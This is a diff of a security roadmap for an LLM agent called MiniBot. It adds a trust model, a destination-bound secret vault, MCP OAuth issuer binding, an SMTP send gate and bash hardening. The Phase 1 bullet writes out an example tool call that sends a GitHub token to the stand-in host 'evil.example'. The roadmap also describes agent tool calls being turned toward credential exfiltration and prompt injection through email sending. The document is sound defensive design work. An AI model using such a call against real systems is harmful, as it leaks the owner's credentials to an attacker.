@@ -2,6 +2,43 @@
 
 Possible roadmap to follow now...
 
+## Trust model
+
+Security here isn't a property of the software alone — it's the combination
+of which tools are enabled, where MiniBot runs, what credentials it's given,
+how trusted the inputs are, and what the blast radius of a tool doing the
+wrong thing actually is. A fairly permissive `bash` is a reasonable choice
+inside a disposable VM/container with no valuable credentials and a personal
+Telegram account; the same tool is a very different risk next to `~/.ssh`,
+cloud credentials, or LAN access.
+
+MiniBot's job is not to make it impossible for the agent to do damage — that
+would mean rebuilding a sandbox platform inside the agent, a race it can't
+win against dedicated isolation tooling. The goal is **safe defaults,
+explicit escape hatches, a documented trust model** — not an implicit
+guarantee the software can't actually make.
+
+- **MiniBot's own responsibility**: safe-by-default config
+  (`bash.pass_parent_env = false`), secrets never reaching the LLM (Phase 1),
+  guardrails on consequential actions (Phase 3's SMTP gate, Phase 4). These
+  matter *regardless of deployment*, because the LLM provider itself — the
+  remote API — sees whatever ends up in tool-call arguments and context, no
+  matter how isolated the host is. No amount of sandboxing the process
+  protects against that; only not putting the secret there in the first
+  place does. This is why the vault stays high priority even for an owner
+  who already runs MiniBot in a throwaway VM.
+- **Deployment's responsibility**: OS/filesystem/process isolation for
+  `bash`/`python_exec` (Phase 5's jail/container options). An owner who
+  already isolates the host can reasonably set `sandbox_mode = "none"` and
+  accept the ambient risk — that's a valid choice, not a bug to prevent.
+
+Worth stating this plainly in the README/docs, roughly:
+
+> MiniBot can execute powerful tools such as shell commands and Python code.
+> It is not intended to be a security boundary by itself. For untrusted
+> workloads or deployments with sensitive host data, run MiniBot inside an
+> appropriately isolated environment.
+
 ## Phase 0 — fix bash's env default now (no dependency on anything else)
 
 `BashToolConfig.pass_parent_env` defaults to `True`
@@ -37,28 +74,46 @@ Ansible-vault-style design, shipped as an optional extension (not core):
   `cryptography` (new poetry extra `vault = ["cryptography"]` — stdlib has no
   AES; don't hand-roll a cipher).
 - Key derived from a password via scrypt/PBKDF2 + a stored salt. Supplied
-  once at daemon startup, owner's choice of method — interactive prompt
-  (blocks start, no password on disk), `--vault-password-file`, or
-  `MINIBOT_VAULT_PASSWORD` — then kept only in the vault adapter's memory,
-  never exported to a subprocess. **This is not safe under bash's current
-  default** (see Phase 5 — `pass_parent_env=True` copies the whole process
-  environment into every `bash` call). The env-var unlock method only holds
-  once that's fixed. Whichever method is used, that password/file becomes the
-  thing to protect instead.
+  once at daemon startup. **Interactive prompt is the recommended, safe-by-
+  default method for v1** — no password or key material ever touches disk.
+  `--vault-password-file` and `MINIBOT_VAULT_PASSWORD` are supported but not
+  on equal footing — ship with an explicit warning: Phase 0 only fixes env
+  inheritance, it says nothing about `--vault-password-file`, which stays
+  exposed to `bash` reading it directly off disk (no cwd jail at all — see
+  Phase 5) regardless of Phase 0. Both alternate methods stay a real risk
+  until Phase 5's filesystem isolation lands, not just the env-var one.
+  Whichever method is used, that password/file becomes the thing to protect
+  instead.
 - CLI helper `minibot vault edit <path>` — like `ansible-vault edit`:
   decrypt to a 0600 temp file, launch `$EDITOR`, re-encrypt on exit, shred the
   temp file. This is how the owner writes secrets; the LLM never gets a
   write path either.
 - LLM-facing tool surface: `list_secrets()` (names only). No `get_secret`
-  tool at all — resolution of `secret://name` happens inside `http_client`
-  and `MCPClient` when building outbound headers, never via a callable tool.
-- No new "hooks" framework needed: `execute_tool_calls_for_runtime`
-  (`minibot/llm/services/tool_executor.py:279`) already funnels every tool
-  call through one point before `binding.handler(...)` runs. That's where
-  `secret://name` substitution happens, and where a raw-secret-value check on
-  `arguments` rejects a call instead of running it. Both are literal
-  string/containment checks against known vault entries, not semantic
-  classification — allowed under the project's output-classification rule.
+  tool at all.
+- **Secrets are destination-bound, not LLM-referenceable.** A `secret://name`
+  string must never be something the LLM writes into a tool argument that a
+  generic executor then substitutes — that would turn the vault into a
+  decryption oracle any tool call could invoke, e.g.
+  `http_request(url="https://evil.example", headers={"Authorization":
+  "secret://github"})` exfiltrates the token to an attacker-chosen
+  destination without the LLM ever seeing the value. Instead, an admin binds
+  a secret to a specific destination in config: `MCPClient` resolves its own
+  server's stored token internally (server/issuer come from config, not LLM
+  input); the SMTP adapter resolves its own configured credential the same
+  way. `http_client` gets **no generic vault access** in v1 — either no
+  vault-backed auth at all for that tool, or, if a real need shows up later,
+  a `[tools.http_client.credentials]` domain-allowlist that the adapter
+  checks against the *actual request host*, attaching the header itself
+  when it matches. The LLM never writes or sees a secret reference either
+  way.
+- `execute_tool_calls_for_runtime` (`minibot/llm/services/tool_executor.py:
+  279`) is the choke point for the *other* side of this instead: redacting
+  any known secret value out of a `ToolResult` (and logs) before it reaches
+  the LLM, and rejecting a call whose target isn't the destination a bound
+  credential is configured for. It is not where secrets get resolved — a
+  literal containment/redaction check against known vault values, not
+  semantic classification, so it's allowed under the project's
+  output-classification rule either way.
 
 Out of scope for this vault: today's `${ENV_VAR}` config-time secrets
 (`token_env`, static MCP headers). Different threat model — admin-authored,
@@ -76,22 +131,36 @@ changes.
 Scope: alternative 1 only (auth-code + PKCE + manual callback paste). No HTTP
 callback endpoint, no device flow.
 
+Target the MCP authorization spec `2026-07-28` (confirmed via
+`blog.modelcontextprotocol.io/posts/2026-07-28/`), not a generic OAuth
+implementation that happens to work against two test servers:
+
+- Validate the `iss` parameter (RFC 9207) before redeeming an authorization
+  code — closes the authorization-server mix-up hole the spec calls out.
+- Credentials are bound to the issuing authorization server and must not be
+  reused across issuers — this is a hard constraint from the spec, not just
+  good hygiene, so token storage should key by issuer, not just server name.
+- Dynamic Client Registration is deprecated in favor of Client ID Metadata
+  Documents (CIMD) but still functional for backward compatibility — prefer
+  CIMD where a server advertises support, fall back to DCR otherwise.
+
 - `MCPClient` (`minibot/adapters/mcp/client.py`) catches `401` on HTTP
   transport, runs MCP OAuth discovery, holds PKCE state.
 - Resulting tokens stored in the Phase 1 vault, keyed by
-  `(server_name, issuer)`.
+  `(server_name, issuer)` — issuer is the binding that actually matters per
+  the spec constraint above; `server_name` is bookkeeping on top of it.
 - `_build_http_headers` resolves the vault reference into the `Authorization`
   header at request time.
 - Owner-only admin surface (not an LLM tool) to present the auth URL and
   accept the pasted callback, via Telegram authorization.
 
-- Output side, not just input: nothing here stops a resolved secret coming
-  *back* in a tool result (an API that echoes the `Authorization` header in
-  an error message, an SMTP server's debug reply) and landing in
-  `ToolResult.content` — which flows into LLM context, then conversation
-  memory (SQLite), then compaction summaries, permanently. The same
-  raw-value containment check planned for `arguments` needs to run
-  symmetrically on the result before it's returned.
+- Output-side redaction is the one place this matters most: nothing stops a
+  resolved secret coming *back* in a tool result (an API that echoes the
+  `Authorization` header in an error message, an SMTP server's debug reply)
+  and landing in `ToolResult.content` — which flows into LLM context, then
+  conversation memory (SQLite), then compaction summaries, permanently. This
+  is the redaction check from Phase 1's tool-executor bullet, applied here
+  concretely.
 - MCP token refresh has no lock. `MCPClient` is per-server with no mutex
   around refresh — two tool calls near token expiry could both refresh
   concurrently; some providers invalidate the old refresh token when issuing
@@ -107,16 +176,26 @@ callback endpoint, no device flow.
 ## Phase 3 — SMTP tool
 
 - `SMTPToolConfig` next to `HTTPClientToolConfig`.
-- Credentials passed as a `secret://` reference, resolved at send time.
+- Credentials bound to the SMTP adapter per Phase 1's destination-bound
+  model (config-supplied, not an LLM-writable reference).
 - No new credential-handling code — reuses Phase 1 vault.
+- Sending mail is more consequential than an HTTP GET (irreversible,
+  externally visible, a classic prompt-injection target). MiniBot has no
+  existing generic action-approval mechanism today, so don't build one for
+  this — keep it SMTP-scoped: a minimal confirm-before-send gate (e.g. an
+  owner-facing Telegram confirmation, or a `dry_run` default) rather than a
+  cross-cutting approval framework.
 
 ## Phase 4 — Guardrail enhancements
 
-Not a duplicate of Phase 1's containment check. Phase 1 only catches a
-value already *stored in the vault* appearing in arguments — it does
-nothing if a secret got into the conversation another way (the user pastes
-a raw API key into chat instead of storing it first, or the LLM produces
-something secret-shaped). This phase covers that gap instead:
+Not a duplicate of Phase 1. Under the destination-bound model, the LLM never
+has a `secret://` reference to put in an argument at all, so there's nothing
+in Phase 1 checking argument *content* for known vault values — its
+redaction check only runs on tool *results*. This phase covers the input
+side: a secret that entered the conversation another way entirely (the user
+pastes a raw API key into chat instead of storing it, or the LLM produces
+something secret-shaped) and could otherwise get echoed into a later tool
+call's arguments:
 
 - `ToolGuardrailValidator` gains a check for secret-*shaped* values in
   arguments — entropy/prefix heuristics (`sk-`, `ghp_`, long high-entropy
@@ -124,9 +203,22 @@ something secret-shaped). This phase covers that gap instead:
 - `GuardrailDecision` gains a `credential_exposure` field (structured, not
   regex/text classification, per project convention).
 
-## Phase 5 — bash tool sandboxing (problem definition only, no decision yet)
+## Phase 5 — bash tool hardening (mixed priority — see Trust model)
 
-Everything above assumes secrets are safe from `bash` as long as they never
+Two different things live in this phase, deliberately split by who owns
+them:
+
+- **The AST pre-filter below**: MiniBot's job, worth doing on a similar
+  timeline to Phases 1-4. It's cheap, deterministic, and catches accidental
+  destructive commands too, not just adversarial ones — useful even inside
+  a fully-isolated deployment.
+- **The OS-level containment options at the end (1-3)**: per the Trust
+  model above, this is the deployment's job, not something MiniBot's
+  roadmap should try to fully solve by building a sandbox platform into the
+  agent. Kept here as documented options for an owner who wants MiniBot
+  itself to add a layer, not as a committed deliverable.
+
+Everything below assumes secrets are safe from `bash` as long as they never
 appear as plaintext arguments or in a file it can read. That assumption
 doesn't hold today:
 
@@ -184,7 +276,9 @@ ML-based. This is a fast pre-filter for the common dangerous shapes, run in
 front of whatever containment option below is chosen — not a substitute for
 one.
 
-Options to weigh later (not decided):
+Options for an owner who wants MiniBot to add its own containment layer on
+top of deployment-level isolation (not decided, not a committed
+deliverable — see Trust model):
 
 1. Port `python_exec`'s existing `sandbox_mode`/jail-wrapper pattern onto
    `BashToolConfig` — smallest diff, reuses infrastructure already in the
